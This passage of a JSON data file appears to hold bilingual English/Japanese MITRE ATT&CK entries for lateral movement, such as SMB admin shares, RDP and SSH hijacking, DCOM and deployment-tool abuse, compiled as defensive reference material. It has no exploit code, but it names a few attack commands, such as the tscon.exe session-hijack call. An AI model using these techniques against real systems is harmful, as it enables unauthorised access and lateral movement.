                        "description_jp": "攻撃者は[有効なアカウント](https://attack.mitre.org/techniques/T1078)を使用して、サーバーメッセージブロック（SMB）を使用してリモートネットワーク共有と対話する可能性があります。その後、攻撃者はログオンしたユーザーとしてアクションを実行できます。\n\nSMBは、同じネットワークまたはドメイン上のWindowsマシン用のファイル、プリンター、およびシリアルポート共有プロトコルです。攻撃者はSMBを使用してファイル共有と対話し、ネットワーク全体を横方向に移動できるようにする可能性があります。SMBのLinuxおよびmacOS実装では、通常Sambaが使用されます。\n\nWindowsシステムには、管理者のみがアクセスできる非表示のネットワーク共有があり、リモートファイルコピーやその他の管理機能を提供します。ネットワーク共有の例としては、`C$`、`ADMIN$`、`IPC$`などがあります。攻撃者は、このテクニックを管理者レベルの[有効なアカウント](https://attack.mitre.org/techniques/T1078)と組み合わせて使用し、SMB経由でネットワークシステムにリモートアクセスしたり、(引用: Wikipedia Server Message Block)リモートプロシージャコール（RPC）を使用してシステムと対話したり、(引用: TechNet RPC)ファイルを転送したり、リモート実行を通じて転送されたバイナリを実行したりする可能性があります。SMB/RPC経由の認証済みセッションに依存する実行テクニックの例としては、[スケジュールされたタスク/ジョブ](https://attack.mitre.org/techniques/T1053)、[サービス実行](https://attack.mitre.org/techniques/T1569/002)、[Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)などがあります。攻撃者はまた、NTLMハッシュを使用して、[パスザハッシュ](https://attack.mitre.org/techniques/T1550/002)および特定の構成とパッチレベルを持つシステムの管理者共有にアクセスすることもできます。(引用: Microsoft Admin Shares)"
                    },
                    {
                        "id": "T1021.007",
                        "name_eng": "Cloud Services",
                        "name_jp": "クラウドサービス",
                        "description_eng": "Adversaries may log into accessible cloud services within a compromised environment using [Valid Accounts](https://attack.mitre.org/techniques/T1078) that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user. \n\nMany enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., [Cloud API](https://attack.mitre.org/techniques/T1059/009)), using commands such as <code>Connect-AZAccount</code> for Azure PowerShell, <code>Connect-MgGraph</code> for Microsoft Graph PowerShell, and <code>gcloud auth login</code> for the Google Cloud CLI.\n\nIn some cases, adversaries may be able to authenticate to these services via [Application Access Token](https://attack.mitre.org/techniques/T1550/001) instead of a username and password.",
                        "description_jp": "攻撃者は、オンプレミスのユーザーIDと同期またはフェデレーションされている[有効なアカウント](https://attack.mitre.org/techniques/T1078)を使用して、侵害された環境内のアクセス可能なクラウドサービスにログインする可能性があります。その後、攻撃者は管理アクションを実行したり、ログオンしたユーザーとしてクラウドホスト型リソースにアクセスしたりする可能性があります。\n\n多くの企業は、集中管理されたユーザーIDをクラウドサービスにフェデレーションし、ユーザーがドメイン資格情報でログインしてクラウドコントロールプレーンにアクセスできるようにしています。同様に、攻撃者は、Azure PowerShellの場合は<code>Connect-AZAccount</code>、Microsoft Graph PowerShellの場合は<code>Connect-MgGraph</code>、Google Cloud CLIの場合は<code>gcloud auth login</code>などのコマンドを使用して、Webコンソールまたはクラウドコマンドラインインターフェイス（CLI）（[クラウドAPI](https://attack.mitre.org/techniques/T1059/009)など）を通じて利用可能なクラウドサービスに接続する可能性があります。\n\n場合によっては、攻撃者はユーザー名とパスワードの代わりに[アプリケーションアクセストークン](https://attack.mitre.org/techniques/T1550/001)を介してこれらのサービスに認証できる可能性があります。"
                    },
                    {
                        "id": "T1021.001",
                        "name_eng": "Remote Desktop Protocol",
                        "name_jp": "リモートデスクトッププロトコル",
                        "description_eng": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\n\nRemote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services) \n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1546/008) or [Terminal Services DLL](https://attack.mitre.org/techniques/T1505/005) for Persistence.(Citation: Alperovitch Malware)",
                        "description_jp": "攻撃者は[有効なアカウント](https://attack.mitre.org/techniques/T1078)を使用して、リモートデスクトッププロトコル（RDP）を使用してコンピュータにログインする可能性があります。その後、攻撃者はログオンしたユーザーとしてアクションを実行できます。\n\nリモートデスクトップはオペレーティングシステムの一般的な機能です。これにより、ユーザーはリモートシステム上のシステムデスクトップグラフィカルユーザーインターフェイスとの対話型セッションにログインできます。Microsoftは、リモートデスクトッププロトコル（RDP）の実装をリモートデスクトップサービス（RDS）と呼んでいます。(引用: TechNet Remote Desktop Services)\n\nサービスが有効になっており、既知の資格情報を持つアカウントへのアクセスが許可されている場合、攻撃者はRDP/RDS経由でリモートシステムに接続してアクセスを拡大する可能性があります。攻撃者は、RDPで使用する資格情報を取得するために、おそらく認証情報アクセステクニックを使用します。攻撃者はまた、永続化のために[アクセシビリティ機能](https://attack.mitre.org/techniques/T1546/008)または[ターミナルサービスDLL](https://attack.mitre.org/techniques/T1505/005)と組み合わせてRDPを使用する可能性もあります。(引用: Alperovitch Malware)"
                    },
                    {
                        "id": "T1021.003",
                        "name_eng": "Distributed Component Object Model",
                        "name_jp": "分散コンポーネントオブジェクトモデル",
                        "description_eng": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.\n\nThe Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June 2019)(Citation: Microsoft COM)\n\nPermissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.(Citation: Microsoft Process Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM.(Citation: Microsoft COM ACL)\n\nThrough DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods.(Citation: Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents(Citation: Enigma Excel DCOM Sept 2017) and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) (DDE) execution directly through a COM created instance of a Microsoft Office application(Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document. DCOM can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). (Citation: MSDN WMI)",
                        "description_jp": "攻撃者は[有効なアカウント](https://attack.mitre.org/techniques/T1078)を使用して、分散コンポーネントオブジェクトモデル（DCOM）を利用してリモートマシンと対話する可能性があります。その後、攻撃者はログオンしたユーザーとしてアクションを実行できます。\n\nWindowsコンポーネントオブジェクトモデル（COM）は、ソフトウェアオブジェクト（1つ以上のインターフェイスを実装する実行可能コード）間の対話を可能にするネイティブWindowsアプリケーションプログラミングインターフェイス（API）のコンポーネントです。COMを介して、クライアントオブジェクトはサーバーオブジェクトのメソッドを呼び出すことができ、これらは通常、ダイナミックリンクライブラリ（DLL）または実行可能ファイル（EXE）です。分散COM（DCOM）は、リモートプロシージャコール（RPC）テクノロジを使用してCOMの機能をローカルコンピュータを超えて拡張する透過的なミドルウェアです。(引用: Fireeye Hunting COM June 2019)(引用: Microsoft COM)\n\nローカルおよびリモートサーバーのCOMオブジェクトと対話する権限は、レジストリ内のアクセス制御リスト（ACL）によって指定されます。(引用: Microsoft Process Wide Com Keys) デフォルトでは、管理者のみがDCOMを介してCOMオブジェクトをリモートでアクティブ化および起動できます。(引用: Microsoft COM ACL)\n\nDCOMを介して、適切に特権を与えられたユーザーのコンテキストで動作する攻撃者は、Officeアプリケーションを介して任意のリモート実行、さらには直接シェルコード実行を取得できます。(引用: Enigma Outlook DCOM Lateral Movement Nov 2017) また、安全でないメソッドを含む他のWindowsオブジェクトも同様です。(引用: Enigma MMC20 COM Jan 2017)(引用: Enigma DCOM Lateral Movement Jan 2017) DCOMは既存のドキュメントでマクロを実行することもでき(引用: Enigma Excel DCOM Sept 2017)、Microsoft OfficeアプリケーションのCOM作成インスタンスを介して直接[動的データ交換](https://attack.mitre.org/techniques/T1559/002)（DDE）実行を呼び出すこともあり、悪意のあるドキュメントの必要性をバイパスします。(引用: Cyberreason DCOM DDE Lateral Movement Nov 2017) DCOMは、[Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)とリモートで対話する方法として使用できます。(引用: MSDN WMI)"
                    },
                    {
                        "id": "T1021.008",
                        "name_eng": "Direct Cloud VM Connections",
                        "name_jp": "ダイレクトクラウドVM接続",
                        "description_eng": "Adversaries may leverage [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log directly into accessible cloud hosted compute infrastructure through cloud native methods. Many cloud providers offer interactive connections to virtual infrastructure that can be accessed through the [Cloud API](https://attack.mitre.org/techniques/T1059/009), such as Azure Serial Console(Citation: Azure Serial Console), AWS EC2 Instance Connect(Citation: EC2 Instance Connect)(Citation: lucr-3: Getting SaaS-y in the cloud), and AWS System Manager.(Citation: AWS System Manager).\n\nMethods of authentication for these connections can include passwords, application access tokens, or SSH keys. These cloud native methods may, by default, allow for privileged access on the host with SYSTEM or root level access. \n\nAdversaries may utilize these cloud native methods to directly access virtual infrastructure and pivot through an environment.(Citation: SIM Swapping and Abuse of the Microsoft Azure Serial Console) These connections typically provide direct console access to the VM rather than the execution of scripts (i.e., [Cloud Administration Command](https://attack.mitre.org/techniques/T1651)).",
                        "description_jp": "攻撃者は[有効なアカウント](https://attack.mitre.org/techniques/T1078)を利用して、クラウドネイティブな方法を通じて、アクセス可能なクラウドホスト型コンピューティングインフラストラクチャに直接ログインする可能性があります。多くのクラウドプロバイダーは、Azureシリアルコンソール(引用: Azure Serial Console)、AWS EC2 Instance Connect(引用: EC2 Instance Connect)(引用: lucr-3: Getting SaaS-y in the cloud)、AWS System Manager(引用: AWS System Manager)など、[クラウドAPI](https://attack.mitre.org/techniques/T1059/009)を通じてアクセスできる仮想インフラストラクチャへの対話型接続を提供しています。\n\nこれらの接続の認証方法には、パスワード、アプリケーションアクセストークン、またはSSHキーが含まれます。これらのクラウドネイティブな方法は、デフォルトで、SYSTEMまたはルートレベルのアクセス権を持つホストへの特権アクセスを許可する場合があります。\n\n攻撃者はこれらのクラウドネイティブな方法を利用して、仮想インフラストラクチャに直接アクセスし、環境全体をピボットする可能性があります。(引用: SIM Swapping and Abuse of the Microsoft Azure Serial Console) これらの接続は通常、スクリプトの実行（つまり、[クラウド管理コマンド](https://attack.mitre.org/techniques/T1651)）ではなく、VMへの直接コンソールアクセスを提供します。"
                    },
                    {
                        "id": "T1021.004",
                        "name_eng": "SSH",
                        "name_jp": "SSH",
                        "description_eng": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.\n\nSSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. On ESXi, SSH can be enabled either directly on the host (e.g., via `vim-cmd hostsvc/enable_ssh`) or via vCenter.(Citation: Sygnia ESXi Ransomware 2025)(Citation: TrendMicro ESXI Ransomware)(Citation: Sygnia Abyss Locker 2025) The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user’s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user (i.e., [SSH Authorized Keys](https://attack.mitre.org/techniques/T1098/004)).",
                        "description_jp": "攻撃者は[有効なアカウント](https://attack.mitre.org/techniques/T1078)を使用して、セキュアシェル（SSH）を使用してリモートマシンにログインする可能性があります。その後、攻撃者はログオンしたユーザーとしてアクションを実行できます。\n\nSSHは、承認されたユーザーが他のコンピューターでリモートシェルを開くことを許可するプロトコルです。多くのLinuxおよびmacOSバージョンにはSSHがデフォルトでインストールされていますが、通常はユーザーが有効にするまで無効になっています。ESXiでは、SSHはホスト上で直接（例：`vim-cmd hostsvc/enable_ssh`経由）またはvCenter経由で有効にできます。(引用: Sygnia ESXi Ransomware 2025)(引用: TrendMicro ESXI Ransomware)(引用: Sygnia Abyss Locker 2025) SSHサーバーは、標準のパスワード認証を使用するか、パスワードの代わりまたは追加として公開鍵と秘密鍵のペアを使用するように構成できます。この認証シナリオでは、ユーザーの公開鍵は、サーバーを実行しているコンピューター上の特別なファイルにあり、そのユーザーとしてログインできるキーペアをリストします（つまり、[SSH認証キー](https://attack.mitre.org/techniques/T1098/004)）。"
                    }
                ]
            },
            {
                "id": "T1563",
                "name_eng": "Remote Service Session Hijacking",
                "name_jp": "リモートサービスセッションハイジャック",
                "description_eng": "Adversaries may take control of preexisting sessions with remote services to move laterally in an environment. Users may use valid credentials to log into a service specifically designed to accept remote connections, such as telnet, SSH, and RDP. When a user logs into a service, a session will be established that will allow them to maintain a continuous interaction with that service.\n\nAdversaries may commandeer these sessions to carry out actions on remote systems. [Remote Service Session Hijacking](https://attack.mitre.org/techniques/T1563) differs from use of [Remote Services](https://attack.mitre.org/techniques/T1021) because it hijacks an existing session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: RDP Hijacking Medium)(Citation: Breach Post-mortem SSH Hijack)",
                "description_jp": "攻撃者は、既存のリモートサービスとのセッションを制御して、環境内で横方向に移動する可能性があります。ユーザーは有効な資格情報を使用して、telnet、SSH、RDPなど、リモート接続を受け入れるように特別に設計されたサービスにログインする場合があります。ユーザーがサービスにログインすると、そのサービスとの継続的な対話を維持できるセッションが確立されます。\n\n攻撃者はこれらのセッションを乗っ取ってリモートシステムでアクションを実行する可能性があります。[リモートサービスセッションハイジャック](https://attack.mitre.org/techniques/T1563)は、[有効なアカウント](https://attack.mitre.org/techniques/T1078)を使用して新しいセッションを作成するのではなく、既存のセッションをハイジャックするため、[リモートサービス](https://attack.mitre.org/techniques/T1021)の使用とは異なります。(引用: RDP Hijacking Medium)(引用: Breach Post-mortem SSH Hijack)",
                "subtechniques": [
                    {
                        "id": "T1563.002",
                        "name_eng": "RDP Hijacking",
                        "name_jp": "RDPハイジャック",
                        "description_eng": "Adversaries may hijack a legitimate user’s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services)\n\nAdversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console, `c:\\windows\\system32\\tscon.exe [session number to be stolen]`, an adversary can hijack a session without the need for credentials or prompts to the user.(Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions.(Citation: RDP Hijacking Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.(Citation: Kali Redsnarf)",
                        "description_jp": "攻撃者は、正当なユーザーのリモートデスクトップセッションをハイジャックして、環境内で横方向に移動する可能性があります。リモートデスクトップはオペレーティングシステムの一般的な機能です。これにより、ユーザーはリモートシステム上のシステムデスクトップグラフィカルユーザーインターフェイスとの対話型セッションにログインできます。Microsoftは、リモートデスクトッププロトコル（RDP）の実装をリモートデスクトップサービス（RDS）と呼んでいます。(引用: TechNet Remote Desktop Services)\n\n攻撃者はRDPセッションハイジャックを実行する可能性があり、これには正当なユーザーのリモートセッションを盗むことが含まれます。通常、他の誰かが自分のセッションを盗もうとしている場合、ユーザーには通知されます。システム権限とターミナルサービスコンソール（`c:\\windows\\system32\\tscon.exe [盗むセッション番号]`）を使用すると、攻撃者は資格情報やユーザーへのプロンプトなしにセッションをハイジャックできます。(引用: RDP Hijacking Korznikov) これは、リモートまたはローカルで、アクティブまたは切断されたセッションで実行できます。(引用: RDP Hijacking Medium) また、ドメイン管理者またはより権限の高いアカウントセッションを盗むことにより、[リモートシステムの発見](https://attack.mitre.org/techniques/T1018)および権限昇格につながる可能性もあります。これらすべてはネイティブWindowsコマンドを使用して実行できますが、レッドチームツールにも機能として追加されています。(引用: Kali Redsnarf)"
                    },
                    {
                        "id": "T1563.001",
                        "name_eng": "SSH Hijacking",
                        "name_jp": "SSHハイジャック",
                        "description_eng": "Adversaries may hijack a legitimate user's SSH session to move laterally within an environment. Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.\n\nIn order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial.(Citation: Slideshare Abusing SSH)(Citation: SSHjack Blackhat)(Citation: Clockwork SSH Agent Hijacking)(Citation: Breach Post-mortem SSH Hijack)\n\n[SSH Hijacking](https://attack.mitre.org/techniques/T1563/001) differs from use of [SSH](https://attack.mitre.org/techniques/T1021/004) because it hijacks an existing SSH session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).",
                        "description_jp": "攻撃者は、正当なユーザーのSSHセッションをハイジャックして、環境内で横方向に移動する可能性があります。セキュアシェル（SSH）は、LinuxおよびmacOSシステムでのリモートアクセスの標準的な手段です。これにより、ユーザーは暗号化されたトンネルを介して別のシステムに接続でき、通常はパスワード、証明書、または非対称暗号化キーペアの使用を通じて認証します。\n\n侵害されたホストから横方向に移動するために、攻撃者は既存の別のシステムへの接続をハイジャックすることにより、アクティブなSSHセッションで公開鍵認証を介して確立された他のシステムとの信頼関係を利用する可能性があります。これは、SSHエージェント自体を侵害するか、エージェントのソケットへのアクセス権を持つことによって発生する可能性があります。攻撃者がルートアクセスを取得できた場合、SSHセッションのハイジャックは些細なことである可能性があります。(引用: Slideshare Abusing SSH)(引用: SSHjack Blackhat)(引用: Clockwork SSH Agent Hijacking)(引用: Breach Post-mortem SSH Hijack)\n\n[SSHハイジャック](https://attack.mitre.org/techniques/T1563/001)は、[有効なアカウント](https://attack.mitre.org/techniques/T1078)を使用して新しいセッションを作成するのではなく、既存のSSHセッションをハイジャックするため、[SSH](https://attack.mitre.org/techniques/T1021/004)の使用とは異なります。"
                    }
                ]
            },
            {
                "id": "T1072",
                "name_eng": "Software Deployment Tools",
                "name_jp": "ソフトウェア展開ツール",
                "description_eng": "Adversaries may gain access to and use centralized software suites installed within an enterprise to execute commands and move laterally through the network. Configuration management and software deployment applications may be used in an enterprise network or cloud environment for routine administration purposes. These systems may also be integrated into CI/CD pipelines. Examples of such solutions include: SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft Intune, Azure Arc, and GCP Deployment Manager.  \n\nAccess to network-wide or enterprise-wide endpoint management software may enable an adversary to achieve remote code execution on all connected systems. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.\n\nSaaS-based configuration management services may allow for broad [Cloud Administration Command](https://attack.mitre.org/techniques/T1651) on cloud-hosted instances, as well as the execution of arbitrary commands on on-premises endpoints. For example, Microsoft Configuration Manager allows Global or Intune Administrators to run scripts as SYSTEM on on-premises devices joined to Entra ID.(Citation: SpecterOps Lateral Movement from Azure to On-Prem AD 2020) Such services may also utilize [Web Protocols](https://attack.mitre.org/techniques/T1071/001) to communicate back to adversary owned infrastructure.(Citation: Mitiga Security Advisory: SSM Agent as Remote Access Trojan)\n\nNetwork infrastructure devices may also have configuration management tools that can be similarly abused by adversaries.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)\n\nThe permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to access specific functionality.",
                "description_jp": "攻撃者は、企業内にインストールされた集中型のソフトウェア・スイートへアクセスし、それを使用してコマンドを実行し、ネットワーク内を横方向に移動する可能性がある。構成管理およびソフトウェアデプロイメントアプリケーションは、企業ネットワークまたはクラウド環境において、日常的な管理目的で使用されることがある。これらのシステムは、CI/CDパイプラインに統合されることもある。このようなソリューションの例としては、以下が挙げられる：SCCM、HBSS、Altiris、AWS Systems Manager、Microsoft Intune、Azure Arc、GCP Deployment Managerなどである。\n\nネットワーク全体または企業全体のエンドポイント管理ソフトウェアにアクセスすることで、敵対者は接続されているすべてのシステム上でリモートコード実行を実現できる可能性があります。このアクセスは、他のシステムへの横移動、情報収集、またはすべてのエンドポイントのハードドライブのワイプなど、特定の効果を引き起こすために使用される可能性があります。\n\nSaaSベースの構成管理サービスは、クラウドホスティングされたインスタンス上で広範な[クラウド管理コマンド](https://attack.mitre.org/techniques/T1651)を許可するだけでなく、オンプレミスのエンドポイント上で任意のコマンドを実行することもできる。例えば、Microsoft Configuration Managerでは、グローバル管理者やIntune管理者が、Entra IDに参加したオンプレミスデバイス上でSYSTEMとしてスクリプトを実行することができます(引用: SpecterOps Lateral Movement from Azure to On-Prem AD 2020)。このようなサービスでは、[Webプロトコル](https://attack.mitre.org/techniques/T1071/001)を利用して、敵が所有するインフラストラクチャに通信を戻すこともできます(引用: Mitiga Security Advisory: SSM Agent as Remote Access Trojan)。\n\nネットワークインフラストラクチャデバイスもまた、同様に敵対者に悪用される可能性のある設定管理ツールを備えている場合があります。(引用：フォーティネットのゼロデイマルウェアとカスタムマルウェア、スパイ活動で容疑のかかった中国人が使用)\n\nこのアクションに必要な権限は、システム構成によって異なります。サードパーティシステムに直接アクセスできるローカル認証情報で十分な場合もあれば、特定のドメイン認証情報が必要な場合もあります。しかし、システムは、ログインするため、または特定の機能にアクセスするために、管理者アカウントを必要とする場合があります。",
                "subtechniques": []
            },
            {
                "id": "T1210",
                "name_eng": "Exploitation of Remote Services",
                "name_jp": "リモートサービスの悪用",
                "description_eng": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB(Citation: CIS Multiple SMB Vulnerabilities) and RDP(Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL(Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)(Citation: Ars Technica VMWare Code Execution Vulnerability 2021) Additionally, there have been a number of vulnerabilities in VMware vCenter installations, which may enable threat actors to move laterally from the compromised vCenter server to virtual machines or even to ESXi hypervisors.(Citation: Broadcom VMSA-2024-0019)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "description_jp": "攻撃者は、ネットワーク内に侵入した後、内部システムへの不正アクセスを取得するためにリモートサービスを悪用する可能性があります。ソフトウェアの脆弱性の悪用は、攻撃者がプログラム、サービス、またはオペレーティングシステムのソフトウェアやカーネル自体のプログラミングエラーを利用して、攻撃者が制御するコードを実行する場合に発生します。侵害後のリモートサービスの悪用の一般的な目標は、リモートシステムへのアクセスを可能にするための横方向の移動です。\n\n攻撃者は、リモートシステムが脆弱な状態にあるかどうかを判断する必要がある場合があり、これは[ネットワークサービスディスカバリ](https://attack.mitre.org/techniques/T1046)またはネットワークに展開されている可能性のある一般的な脆弱なソフトウェア、脆弱性を示す可能性のある特定のパッチの欠如、またはリモートエクスプロイトを検出または封じ込めるために使用される可能性のあるセキュリティソフトウェアを探す他のディスカバリメソッドを通じて行われる可能性があります。サーバーは横方向の移動エクスプロイトの価値の高いターゲットである可能性が高いですが、エンドポイントシステムも、利点や追加リソースへのアクセスを提供する場合、リスクにさらされる可能性があります。\n\nSMB(引用: CIS Multiple SMB Vulnerabilities)やRDP(引用: NVD CVE-2017-0176)などの一般的なサービスや、MySQL(引用: NVD CVE-2016-6662)やWebサーバーサービス(引用: NVD CVE-2014-7169)(引用: Ars Technica VMWare Code Execution Vulnerability 2021)などの内部ネットワーク内で使用される可能性のあるアプリケーションには、いくつかのよく知られた脆弱性が存在します。さらに、VMware vCenterのインストールには多数の脆弱性があり、これにより脅威アクターは侵害されたvCenterサーバーから仮想マシン、さらにはESXiハイパーバイザーに横方向に移動できる可能性があります。(引用: Broadcom VMSA-2024-0019)\n\n脆弱なリモートサービスの権限レベルによっては、攻撃者は横方向の移動エクスプロイトの結果として[権限昇格のための悪用](https://attack.mitre.org/techniques/T1068)を達成する可能性もあります。",
                "subtechniques": []
            },
            {
                "id": "T1534",
                "name_eng": "Internal Spearphishing",
                "name_jp": "内部スピアフィッシング",
                "description_eng": "After they already have access to accounts or systems within the environment, adversaries may use internal spearphishing to gain access to additional information or compromise other users within the same organization. Internal spearphishing is multi-staged campaign where a legitimate account is initially compromised either by controlling the user's device or by compromising the account credentials of the user. Adversaries may then attempt to take advantage of the trusted internal account to increase the likelihood of tricking more victims into falling for phish attempts, often incorporating [Impersonation](https://attack.mitre.org/techniques/T1656).(Citation: Trend Micro - Int SP)\n\nFor example, adversaries may leverage [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) or [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through [Input Capture](https://attack.mitre.org/techniques/T1056) on sites that mimic login interfaces.\n\nAdversaries may also leverage internal chat apps, such as Microsoft Teams, to spread malicious content or engage users in attempts to capture sensitive information and/or credentials.(Citation: Int SP - chat apps)",
                "description_jp": "環境内のアカウントまたはシステムへのアクセスを既に取得した後、攻撃者は内部スピアフィッシングを使用して、追加情報へのアクセスを取得したり、同じ組織内の他のユーザーを侵害したりする可能性があります。内部スピアフィッシングは、ユーザーのデバイスを制御するか、ユーザーのアカウント資格情報を侵害することによって、正当なアカウントが最初に侵害される多段階キャンペーンです。その後、攻撃者は信頼された内部アカウントを利用して、より多くの被害者をフィッシング攻撃に陥れる可能性を高めようとする可能性があり、しばしば[偽装](https://attack.mitre.org/techniques/T1656)を組み込みます。(引用: Trend Micro - Int SP)\n\n例えば、攻撃者は内部スピアフィッシングの一環として[スピアフィッシング添付ファイル](https://attack.mitre.org/techniques/T1566/001)または[スピアフィッシングリンク](https://attack.mitre.org/techniques/T1566/002)を利用してペイロードを配信したり、ログインインターフェイスを模倣したサイトで[入力キャプチャ](https://attack.mitre.org/techniques/T1056)を通じて資格情報をキャプチャするために外部サイトにリダイレクトしたりする可能性があります。\n\n攻撃者はまた、Microsoft Teamsなどの内部チャットアプリを利用して、悪意のあるコンテンツを拡散したり、機密情報や資格情報をキャプチャする試みでユーザーを巻き込んだりする可能性があります。(引用: Int SP - chat apps)",
                "subtechniques": []
            },
            {
                "id": "T1570",
                "name_eng": "Lateral Tool Transfer",
                "name_jp": "ラテラルツール転送",
                "description_eng": "Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation.\n\nAdversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) to connected network shares or with authenticated connections via [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001).(Citation: Unit42 LockerGoga 2019)\n\nFiles can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and [ftp](https://attack.mitre.org/software/S0095). In some cases, adversaries may be able to leverage [Web Service](https://attack.mitre.org/techniques/T1102)s such as Dropbox or OneDrive to copy files from one machine to another via shared, automatically synced folders.(Citation: Dropbox Malware Sync)",
                "description_jp": "攻撃者は、侵害された環境内のシステム間でツールやその他のファイルを転送する可能性があります。被害者環境に持ち込まれた後（つまり、[イングレスツール転送](https://attack.mitre.org/techniques/T1105)）、ファイルは操作の過程で攻撃者のツールやその他のファイルをステージングするために、あるシステムから別のシステムにコピーされる場合があります。\n\n攻撃者は、接続されたネットワーク共有への[SMB/Windows管理共有](https://attack.mitre.org/techniques/T1021/002)経由のファイル共有や、[リモートデスクトッププロトコル](https://attack.mitre.org/techniques/T1021/001)経由の認証済み接続など、固有のファイル共有プロトコルを使用して、横方向の移動をサポートするために内部の被害者システム間でファイルをコピーする可能性があります。(引用: Unit42 LockerGoga 2019)\n\nファイルは、scp、rsync、curl、sftp、[ftp](https://attack.mitre.org/software/S0095)など、被害者システム上のネイティブまたはその他の既存のツールを使用して転送することもできます。場合によっては、攻撃者はDropboxやOneDriveなどの[Webサービス](https://attack.mitre.org/techniques/T1102)を利用して、共有され自動的に同期されるフォルダを介してあるマシンから別のマシンにファイルをコピーできる可能性があります。(引用: Dropbox Malware Sync)",
                "subtechniques": []
            }
